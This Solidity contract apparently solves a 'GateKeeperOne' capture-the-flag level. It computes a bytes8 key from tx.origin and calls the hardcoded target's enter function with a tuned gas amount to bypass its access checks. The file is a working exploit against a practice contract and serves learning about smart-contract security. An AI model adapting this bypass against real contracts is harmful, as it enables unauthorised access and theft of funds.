//SPDX-License-Identifier: MIT

pragma solidity 0.6.0;

import "./math/SafeMath.sol";

contract TrespasserOne {
  using SafeMath for uint256;
  address gateKeeperOne = 0x3f54735976c184cb41580c0921FA785226EAdFd0;
  bytes8 public _key =
    bytes8(int64(uint16(tx.origin) - (uint64(uint32(-1)) + 1)));

  function trespass() public returns (bool success) {
    (success, ) = gateKeeperOne.call.gas(24827)(
      abi.encodeWithSignature("enter(bytes8)", _key)
    );
    require(success, "Could not trespass.");
  }
}
